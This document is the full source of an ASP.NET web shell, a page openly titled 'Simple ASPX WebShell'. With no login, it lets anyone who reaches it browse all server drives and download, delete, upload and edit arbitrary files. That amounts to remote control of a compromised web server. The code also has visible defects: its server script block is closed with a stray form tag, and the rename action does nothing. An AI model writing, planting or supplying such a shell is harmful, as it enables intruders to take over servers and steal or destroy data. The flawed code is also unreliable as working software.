<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Simple ASPX WebShell</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .error { color: red; }
        .success { color: green; }
    </style>
</head>
<body>
    <form runat="server">
        <h2>ASPX WebShell</h2>
        <asp:Label ID="lblMessage" runat="server" />
        <br />
        <asp:TextBox ID="txtPath" runat="server" Width="500px" />
        <asp:Button ID="btnNavigate" runat="server" Text="Go" OnClick="btnNavigate_Click" />
        <br /><br />
        <asp:DropDownList ID="ddlDrives" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlDrives_SelectedIndexChanged" />
        <br /><br />
        <h3>Files and Directories</h3>
        <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" OnRowCommand="gvFiles_RowCommand">
            <Columns>
                <asp:BoundField DataField="Name" HeaderText="Name" />
                <asp:BoundField DataField="Type" HeaderText="Type" />
                <asp:BoundField DataField="Size" HeaderText="Size" />
                <asp:BoundField DataField="LastModified" HeaderText="Last Modified" />
                <asp:TemplateField>
                    <ItemTemplate>
                        <asp:LinkButton ID="btnDownload" runat="server" Text="Download" CommandName="Download" CommandArgument='<%# Eval("FullPath") %>' Visible='<%# Eval("Type").ToString() == "File" %>' />
                        <asp:LinkButton ID="btnDelete" runat="server" Text="Delete" CommandName="Delete" CommandArgument='<%# Eval("FullPath") %>' OnClientClick="return confirm('Are you sure you want to delete this?');" />
                        <asp:LinkButton ID="btnRename" runat="server" Text="Rename" CommandName="Rename" CommandArgument='<%# Eval("FullPath") %>' />
                        <asp:LinkButton ID="btnEdit" runat="server" Text="Edit" CommandName="Edit" CommandArgument='<%# Eval("FullPath") %>' Visible='<%# Eval("Type").ToString() == "File" %>' />
                    </ItemTemplate>
                </asp:TemplateField>
            </Columns>
        </asp:GridView>
        <br />
        <h3>Upload File</h3>
        <asp:FileUpload ID="fileUpload" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
        <br /><br />
        <h3>Edit File</h3>
        <asp:TextBox ID="txtFileContent" runat="server" TextMode="MultiLine" Width="500px" Height="200px" Visible="false" />
        <asp:Button ID="btnSave" runat="server" Text="Save" OnClick="btnSave_Click" Visible="false" />
        <asp:HiddenField ID="hdnEditFilePath" runat="server" />
    </form>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                PopulateDrives();
                string currentDir = Server.MapPath("~");
                txtPath.Text = currentDir;
                LoadDirectory(currentDir);
            }
        }

        protected void PopulateDrives()
        {
            try
            {
                var drives = DriveInfo.GetDrives();
                ddlDrives.Items.Clear();
                foreach (var drive in drives)
                {
                    if (drive.IsReady)
                        ddlDrives.Items.Add(drive.Name);
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "<span class='error'>Error loading drives: " + ex.Message + "</span>";
            }
        }

        protected void btnNavigate_Click(object sender, EventArgs e)
        {
            string path = txtPath.Text;
            if (Directory.Exists(path))
                LoadDirectory(path);
            else
                lblMessage.Text = "<span class='error'>Invalid directory path</span>";
        }

        protected void ddlDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            string path = ddlDrives.SelectedValue;
            txtPath.Text = path;
            LoadDirectory(path);
        }

        protected void LoadDirectory(string path)
        {
            try
            {
                var items = new List<object>();
                DirectoryInfo dirInfo = new DirectoryInfo(path);

                foreach (var dir in dirInfo.GetDirectories())
                {
                    items.Add(new
                    {
                        Name = dir.Name,
                        Type = "Directory",
                        Size = "",
                        LastModified = dir.LastWriteTime.ToString(),
                        FullPath = dir.FullName
                    });
                }

                foreach (var file in dirInfo.GetFiles())
                {
                    items.Add(new
                    {
                        Name = file.Name,
                        Type = "File",
                        Size = (file.Length / 1024) + " KB",
                        LastModified = file.LastWriteTime.ToString(),
                        FullPath = file.FullName
                    });
                }

                gvFiles.DataSource = items;
                gvFiles.DataBind();
                txtPath.Text = path;
            }
            catch (Exception ex)
            {
                lblMessage.Text = "<span class='error'>Error: " + ex.Message + "</span>";
            }
        }

        protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e)
        {
            string path = e.CommandArgument.ToString();
            try
            {
                if (e.CommandName == "Download")
                {
                    FileInfo file = new FileInfo(path);
                    if (file.Exists)
                    {
                        Response.Clear();
                        Response.ContentType = "application/octet-stream";
                        Response.AddHeader("Content-Disposition", "attachment; filename=" + file.Name);
                        Response.TransmitFile(file.FullName);
                        Response.End();
                    }
                }
                else if (e.CommandName == "Delete")
                {
                    if (Directory.Exists(path))
                        Directory.Delete(path, true);
                    else if (File.Exists(path))
                        File.Delete(path);
                    lblMessage.Text = "<span class='success'>Deleted successfully</span>";
                    LoadDirectory(txtPath.Text);
                }
                else if (e.CommandName == "Rename")
                {
                    // For simplicity, rename prompts for new name in textbox
                    lblMessage.Text = "Enter new name in path box and click Rename again to confirm";
                    txtPath.Text = path;
                }
                else if (e.CommandName == "Edit")
                {
                    if (File.Exists(path))
                    {
                        txtFileContent.Text = File.ReadAllText(path);
                        txtFileContent.Visible = true;
                        btnSave.Visible = true;
                        hdnEditFilePath.Value = path;
                    }
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "<span class='error'>Error: " + ex.Message + "</span>";
            }
        }

        protected void btnUpload_Click(object sender, EventArgs e)
        {
            try
            {
                if (fileUpload.HasFile)
                {
                    string path = Path.Combine(txtPath.Text, fileUpload.FileName);
                    fileUpload.SaveAs(path);
                    lblMessage.Text = "<span class='success'>File uploaded successfully</span>";
                    LoadDirectory(txtPath.Text);
                }
            }
            catch (Exception ex)
            {
                lblMessage.Text = "<span class='error'>Error uploading file: " + ex.Message + "</span>";
            }
        }

        protected void btnSave_Click(object sender, EventArgs e)
        {
            try
            {
                string path = hdnEditFilePath.Value;
                File.WriteAllText(path, txtFileContent.Text);
                lblMessage.Text = "<span class='success'>File saved successfully</span>";
                txtFileContent.Visible = false;
                btnSave.Visible = false;
                LoadDirectory(txtPath.Text);
            }
            catch (Exception ex)
            {
                lblMessage.Text = "<span class='error'>Error saving file: " + ex.Message + "</span>";
            }
        }
    </form>
</body>
</html>
